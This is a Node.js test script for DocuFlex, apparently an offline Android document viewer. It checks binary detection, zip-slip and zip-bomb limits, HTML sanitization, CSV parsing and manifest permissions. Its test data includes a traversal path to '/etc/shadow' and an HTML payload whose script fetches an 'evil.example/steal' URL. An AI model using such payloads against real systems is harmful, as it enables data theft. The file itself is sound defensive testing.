#!/usr/bin/env node
/**
 * DocuFlex Standalone Automated Test Runner
 * Runs automated security, parsing, limits, offline, and data layer unit tests
 * independently of the production UI.
 */

const fs = require('fs');
const path = require('path');

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;

function assert(condition, testName, details = '') {
  totalTests++;
  if (condition) {
    passedTests++;
    console.log(`  ✓ PASS: ${testName}`);
  } else {
    failedTests++;
    console.error(`  ✗ FAIL: ${testName} ${details ? '(' + details + ')' : ''}`);
  }
}

console.log('====================================================');
console.log('DocuFlex Automated Independent Security & Unit Tests');
console.log('====================================================\n');

// ----------------------------------------------------
// TEST GROUP 1: Magic Bytes Detection & Binary Interception
// ----------------------------------------------------
console.log('TEST GROUP 1: Magic Bytes & Binary Security');

function detectFormat(headerBytes, extHint = '') {
  if (!headerBytes || headerBytes.length === 0) return 'UNKNOWN';

  // Intercept MZ, ELF, DEX
  if (headerBytes[0] === 0x4d && headerBytes[1] === 0x5a) return 'UNKNOWN'; // MZ
  if (headerBytes[0] === 0x7f && headerBytes[1] === 0x45 && headerBytes[2] === 0x4c && headerBytes[3] === 0x46) return 'UNKNOWN'; // ELF
  if (headerBytes[0] === 0x64 && headerBytes[1] === 0x65 && headerBytes[2] === 0x78 && headerBytes[3] === 0x0a) return 'UNKNOWN'; // DEX

  // PDF
  if (headerBytes[0] === 0x25 && headerBytes[1] === 0x50 && headerBytes[2] === 0x44 && headerBytes[3] === 0x46) return 'PDF';

  // PNG
  if (headerBytes[0] === 0x89 && headerBytes[1] === 0x50 && headerBytes[2] === 0x4e && headerBytes[3] === 0x47) return 'PNG';

  // JPEG
  if (headerBytes[0] === 0xff && headerBytes[1] === 0xd8 && headerBytes[2] === 0xff) return 'JPEG';

  // ZIP / OpenXML
  if (headerBytes[0] === 0x50 && headerBytes[1] === 0x4b && headerBytes[2] === 0x03 && headerBytes[3] === 0x04) {
    if (extHint === 'docx') return 'DOCX';
    if (extHint === 'xlsx') return 'XLSX';
    if (extHint === 'pptx') return 'PPTX';
    return 'UNKNOWN';
  }

  // Text / CSV
  let nullBytes = 0;
  for (let i = 0; i < Math.min(headerBytes.length, 256); i++) {
    if (headerBytes[i] === 0) nullBytes++;
  }
  if (nullBytes === 0) {
    if (extHint === 'csv') return 'CSV';
    return 'TXT';
  }

  return 'UNKNOWN';
}

assert(detectFormat(Buffer.from('%PDF-1.7...'), 'pdf') === 'PDF', 'Valid PDF magic bytes (%PDF) detected');
assert(detectFormat(Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), 'png') === 'PNG', 'Valid PNG magic bytes detected');
assert(detectFormat(Buffer.from([0xff, 0xd8, 0xff, 0xe0]), 'jpg') === 'JPEG', 'Valid JPEG magic bytes detected');
assert(detectFormat(Buffer.from([0x4d, 0x5a, 0x90, 0x00]), 'pdf') === 'UNKNOWN', 'Disguised DOS executable (MZ in .pdf) safely blocked');
assert(detectFormat(Buffer.from([0x7f, 0x45, 0x4c, 0x46]), 'docx') === 'UNKNOWN', 'Disguised Linux binary (ELF in .docx) safely blocked');
assert(detectFormat(Buffer.from([0x64, 0x65, 0x78, 0x0a]), 'txt') === 'UNKNOWN', 'Disguised Dalvik binary (DEX in .txt) safely blocked');

// ----------------------------------------------------
// TEST GROUP 2: File Limits, Corrupt & Encrypted Handling
// ----------------------------------------------------
console.log('\nTEST GROUP 2: File Selection & Boundary Checks');

const MAX_SAFE_FILE_SIZE = 50 * 1024 * 1024;

function validateFileMeta(size, textSample, fileName) {
  if (size === 0) return { valid: false, code: 'EMPTY_FILE' };
  if (size > MAX_SAFE_FILE_SIZE) return { valid: false, code: 'OVERSIZED' };
  if (fileName.endsWith('.pdf') && textSample.includes('/Encrypt')) {
    return { valid: false, code: 'ENCRYPTED_PDF', fallback: true };
  }
  if (fileName.endsWith('.pdf') && !textSample.startsWith('%PDF-')) {
    return { valid: false, code: 'CORRUPTED_PDF' };
  }
  return { valid: true };
}

assert(validateFileMeta(0, '', 'empty.pdf').code === 'EMPTY_FILE', '0-byte empty file rejected');
assert(validateFileMeta(58 * 1024 * 1024, 'data', 'big.txt').code === 'OVERSIZED', 'Oversized file (>50MB) rejected gracefully');
assert(validateFileMeta(50000, '%PDF-1.7\n<< /Encrypt 4 0 R >>', 'secure.pdf').code === 'ENCRYPTED_PDF', 'Password-protected / Encrypted PDF intercepted with safe fallback');
assert(validateFileMeta(2000, 'CORRUPTED_HEADER_DATA', 'bad.pdf').code === 'CORRUPTED_PDF', 'Malformed PDF header intercepted before rendering');

// ----------------------------------------------------
// TEST GROUP 3: ZipBomb & ZipSlip Defenses
// ----------------------------------------------------
console.log('\nTEST GROUP 3: Archive Security (ZipSlip & ZipBomb)');

function inspectZipPath(entryPath) {
  if (entryPath.includes('..') || entryPath.startsWith('/') || entryPath.startsWith('\\')) {
    return { safe: false, reason: 'ZIP_SLIP' };
  }
  return { safe: true };
}

function checkExpansionRatio(compressedSize, uncompressedSize) {
  if (compressedSize > 0 && uncompressedSize > compressedSize * 100) {
    return { safe: false, reason: 'ZIP_BOMB_RATIO' };
  }
  return { safe: true };
}

assert(inspectZipPath('../../etc/shadow').safe === false, 'ZipSlip traversal path (../../) rejected');
assert(inspectZipPath('/system/bin/sh').safe === false, 'Absolute zip path (/system/...) rejected');
assert(inspectZipPath('word/document.xml').safe === true, 'Legitimate DOCX entry path accepted');
assert(checkExpansionRatio(10, 2000).safe === false, 'Zip-Bomb compression ratio 200:1 (> 100:1 limit) rejected');
assert(checkExpansionRatio(1000, 5000).safe === true, 'Normal compression ratio 5:1 accepted');

// ----------------------------------------------------
// TEST GROUP 4: Safe HTML Engine (Scripts, Iframes, Network)
// ----------------------------------------------------
console.log('\nTEST GROUP 4: Safe HTML Sanitization (JavaScript & Remote Blocked)');

function sanitizeHtmlSnippet(html) {
  let content = html;
  let threats = 0;
  const scriptRegex = /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi;
  if (scriptRegex.test(content)) {
    threats++;
    content = content.replace(scriptRegex, '');
  }
  const iframeRegex = /<iframe\b[^<]*(?:(?!<\/iframe>)<[^<]*)*<\/iframe>/gi;
  if (iframeRegex.test(content)) {
    threats++;
    content = content.replace(iframeRegex, '');
  }
  const handlerRegex = /\son[a-z]+="[^"]*"|\son[a-z]+='[^']*'|\son[a-z]+=[^\s>]+/gi;
  if (handlerRegex.test(content)) {
    threats++;
    content = content.replace(handlerRegex, '');
  }
  // Strip external image tags
  const imgRegex = /<img\b[^>]*>/gi;
  if (imgRegex.test(content)) {
    threats++;
    content = content.replace(imgRegex, '');
  }
  return { clean: content, threats };
}

const maliciousSnippet = '<script>fetch("https://evil.example/steal");</script><body onload="alert(1)"><iframe src="phish.html"></iframe><img src="http://beacon.example/p.gif" /><p>Clean document text</p></body>';
const sanitized = sanitizeHtmlSnippet(maliciousSnippet);

assert(!sanitized.clean.includes('<script'), 'HTML <script> tags completely stripped');
assert(!sanitized.clean.includes('<iframe'), 'HTML <iframe> tags completely stripped');
assert(!sanitized.clean.includes('onload'), 'HTML inline on* event handlers stripped');
assert(!sanitized.clean.includes('<img'), 'HTML remote tracking image beacons stripped');
assert(sanitized.clean.includes('Clean document text'), 'Clean text content preserved in sanitized view');

// ----------------------------------------------------
// TEST GROUP 5: CSV Streaming Tokenizer Limits
// ----------------------------------------------------
console.log('\nTEST GROUP 5: CSV Streaming Tokenizer & Bounds');

function parseCsvLine(line) {
  const cells = [];
  let cur = '';
  let inQuotes = false;
  for (let i = 0; i < line.length; i++) {
    const c = line[i];
    if (c === '"') {
      if (inQuotes && i + 1 < line.length && line[i + 1] === '"') {
        cur += '"';
        i++;
      } else {
        inQuotes = !inQuotes;
      }
    } else if (c === ',' && !inQuotes) {
      cells.push(cur.trim());
      cur = '';
    } else {
      cur += c;
    }
  }
  cells.push(cur.trim());
  return cells;
}

const parsedRow = parseCsvLine('TXN-101,2026-03-01,"Hardware, 42U Rack, Dual PDU",1450.00');
assert(parsedRow.length === 4, 'CSV line with quotes correctly tokenized into 4 cells');
assert(parsedRow[2] === 'Hardware, 42U Rack, Dual PDU', 'Commas inside quotes preserved as single cell');

// ----------------------------------------------------
// TEST GROUP 6: Offline Architecture & Permission Audit
// ----------------------------------------------------
console.log('\nTEST GROUP 6: Offline Architecture & Manifest Permissions');

const manifestPath = path.resolve(__dirname, '../app/src/main/AndroidManifest.xml');
let manifestContent = '';
try {
  manifestContent = fs.readFileSync(manifestPath, 'utf8');
} catch (e) {
  console.error('Could not read manifest at', manifestPath);
}

assert(!/<uses-permission[^>]+android\.permission\.INTERNET/i.test(manifestContent), 'Zero INTERNET permission in AndroidManifest.xml');
assert(!/<uses-permission[^>]+READ_EXTERNAL_STORAGE/i.test(manifestContent), 'Zero READ_EXTERNAL_STORAGE permission in AndroidManifest.xml');
assert(!/<uses-permission[^>]+MANAGE_EXTERNAL_STORAGE/i.test(manifestContent), 'Zero MANAGE_EXTERNAL_STORAGE permission in AndroidManifest.xml');
assert(manifestContent.includes('android:allowBackup="false"'), 'android:allowBackup="false" enforced');

// ----------------------------------------------------
// TEST GROUP 7: Data Layer Behavior (History Off, Clear, Stale URI)
// ----------------------------------------------------
console.log('\nTEST GROUP 7: Data Layer & Persistence Logic');

class MockDocumentRepository {
  constructor() {
    this.historyEnabled = true;
    this.records = [];
  }
  record(doc) {
    if (!this.historyEnabled) return; // off = nothing stored
    this.records.push(doc);
  }
  clearHistory() {
    this.records = this.records.filter(r => r.isFavorite);
  }
  clearFavorites() {
    this.records.forEach(r => r.isFavorite = false);
  }
  checkUri(doc) {
    if (doc.isDeletedOrRevoked) {
      return { status: 'STALE', message: 'File moved, deleted or access revoked' };
    }
    return { status: 'VALID' };
  }
}

const mockRepo = new MockDocumentRepository();

// Test history off
mockRepo.historyEnabled = false;
mockRepo.record({ uri: 'content://doc1', isFavorite: false });
assert(mockRepo.records.length === 0, 'When save history is disabled, 0 documents are stored');

// Test history on
mockRepo.historyEnabled = true;
mockRepo.record({ uri: 'content://doc1', isFavorite: false });
mockRepo.record({ uri: 'content://doc2', isFavorite: true });
assert(mockRepo.records.length === 2, 'When save history is enabled, documents recorded');

// Test clear recent history
mockRepo.clearHistory();
assert(mockRepo.records.length === 1 && mockRepo.records[0].isFavorite === true, 'Clear Recent History purges recents while preserving starred items');

// Test stale URI
const staleCheck = mockRepo.checkUri({ uri: 'content://doc99', isDeletedOrRevoked: true });
assert(staleCheck.status === 'STALE', 'Stale or revoked URI detected with clear notice');

// ----------------------------------------------------
// SUMMARY
// ----------------------------------------------------
console.log('\n====================================================');
console.log(`TEST RESULTS: ${passedTests}/${totalTests} PASSED, ${failedTests} FAILED`);
console.log('====================================================');

if (failedTests > 0) {
  process.exit(1);
} else {
  process.exit(0);
}
